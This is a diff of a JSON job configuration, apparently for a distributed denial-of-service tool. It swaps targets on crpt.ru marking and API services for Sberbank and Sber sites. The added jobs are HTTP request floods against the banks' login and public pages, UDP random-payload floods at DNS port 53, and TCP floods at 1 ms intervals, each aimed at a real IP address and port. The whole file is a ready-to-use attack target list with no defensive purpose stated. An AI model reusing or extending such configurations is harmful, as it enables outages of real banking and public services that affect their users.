@@ -1,849 +1,356 @@
 {
   "jobs": [{
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.crpt.ru"
+          "path": "https://online.sberbank.ru/CSAFront/index.do#/"
         },
         "client": {
           "static_host": {
-            "addr": "82.202.190.212:80",
+            "addr": "194.54.14.131:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 30,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://online.sberbank.ru/CSAFront/index.do#/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "194.54.14.131:4477",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 30,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://online.sberbank.ru/CSAFront/index.do#/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "84.252.146.82:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 30,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://online.sberbank.ru/CSAFront/index.do#/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "84.252.146.81:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 30,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://syncplay.online.sberbank.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "194.186.207.127:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 30,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.sberbank.com/ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "194.54.14.168:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.crpt.ru"
+          "path": "https://www.sberbank.com/ru"
         },
         "client": {
           "static_host": {
-            "addr": "82.202.190.212:443",
+            "addr": "194.54.14.168:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "udp",
+      "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
+      "count": 30,
+      "args": {
+        "address": "84.252.147.119:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1000
+      }
+    }, {
+      "type": "udp",
+      "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
+      "count": 30,
+      "args": {
+        "address": "84.252.147.128:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1000
+      }
+    }, {
+      "type": "udp",
+      "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
+      "count": 30,
+      "args": {
+        "address": "84.252.147.129:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1000
+      }
+    }, {
+      "type": "udp",
+      "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
+      "count": 30,
+      "args": {
+        "address": "194.54.14.186:53",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1000
+      }
+    }, {
+      "type": "tcp",
+      "count": 30,
+      "args": {
+        "address": "194.54.15.168:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 30,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://office.sberbank.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "194.54.15.168:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://markirovka.crpt.ru/login-kep"
+          "path": "http://sber.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.101:80",
+            "addr": "185.157.96.130:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://markirovka.crpt.ru/login-kep"
+          "path": "https://sber.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.101:443",
+            "addr": "185.157.96.130:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://milk.crpt.ru/"
+          "path": "http://sber.ru/business"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.101:80",
+            "addr": "185.157.96.130:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://milk.crpt.ru/"
+          "path": "https://sber.ru/business"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.101:443",
+            "addr": "185.157.96.130:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://ismp.crpt.ru"
+          "path": "http://sberdevices.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.101:80",
+            "addr": "95.181.181.254:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://ismp.crpt.ru"
+          "path": "http://sberprime.sber.ru/plus"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v3/facade/cis/cis_list"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v3/auth/cert/key"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v3/facade/identifytools/listV2"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v4/facade/cis/cis_list"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v4/auth/cert/key"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v4/facade/identifytools/listV2"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v3/facade/cis/cis_list"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v3/auth/cert/key"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v3/facade/identifytools/listV2"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v4/facade/cis/cis_list"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v4/auth/cert/key"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru/api/v4/facade/identifytools/listV2"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://markirovka.crpt.ru/api/v3/true-api"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://markirovka.crpt.ru/api/v4/true-api"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://markirovka.crpt.ru/api/v3/true-api"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 11,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://markirovka.crpt.ru/api/v4/true-api"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://edo-gismt.crpt.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.101:80",
+            "addr": "194.54.15.144:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://edo-gismt.crpt.ru/"
+          "path": "https://sberprime.sber.ru/plus"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.101:443",
+            "addr": "194.54.15.144:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://markirovka.crpt.ru/login-kep"
+          "path": "https://promo.sber.ru/sberserenity"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.71:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://markirovka.crpt.ru/login-kep"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
+            "addr": "194.54.15.205:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://milk.crpt.ru/"
+          "path": "https://osago.sberbank.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.71:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://milk.crpt.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
+            "addr": "194.54.15.205:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://ismp.crpt.ru"
+          "path": "https://rabota.sber.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.71:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ismp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
+            "addr": "194.54.15.205:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 21,
+      "count": 30,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://edo-gismt.crpt.ru/"
+          "path": "https://friend.sber.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "91.230.251.71:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://edo-gismt.crpt.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.71:443",
+            "addr": "84.252.144.86:443",
             "is_tls": "true"
           }
         }
       }
     }, {
-      "type": "http",
-      "count": 21,
+      "type": "tcp",
+      "count": 30,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://suzgrid.crpt.ru/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.77:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "185.157.97.168:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 21,
+      "type": "tcp",
+      "count": 30,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://suzgrid.crpt.ru/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.77:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "185.157.97.98:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 21,
+      "type": "tcp",
+      "count": 30,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://suzgrid.crpt.ru:16443/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.77:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "POST",
-          "path": "https://suzgrid.crpt.ru:16443/api/v2/integration/connection?omsId={{random_uuid}}",
-          "headers": {
-            "Content-Type": "application/json;charset=UTF-8",
-            "X-RegistrationKey": "{{random_uuid}}"
-          },
-          "body": "{\"address\":\"Hell\"}"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.77:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://suz2.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.99:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://suz2.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.99:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://api.mdlp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.70:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://api.mdlp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.70:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://kb.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "78.142.221.17:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://kb.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "78.142.221.17:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://nrz.api.sb.mdlp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.81:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://nrz.api.sb.mdlp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.81:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://nrz.api.mdlp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.76:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://nrz.api.mdlp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.76:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://api.sb.mdlp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.82:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://api.sb.mdlp.crpt.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.82:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.78:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.78:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey={{if ge (random_int_n 10) 5}}{{random_int_n 10000000000000}}{{else}}{{random_payload_byte (random_int_n 10) | base64_encode}}{{end}}&gtin={{random_int_n 9999999999999}}"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.78:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.79:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.79:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 21,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey={{if ge (random_int_n 10) 5}}{{random_int_n 10000000000000}}{{else}}{{random_alphanum 12}}{{end}}?gtin={{random_int_n 9999999999999}}"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.230.251.79:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "185.157.97.98:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }
   ]
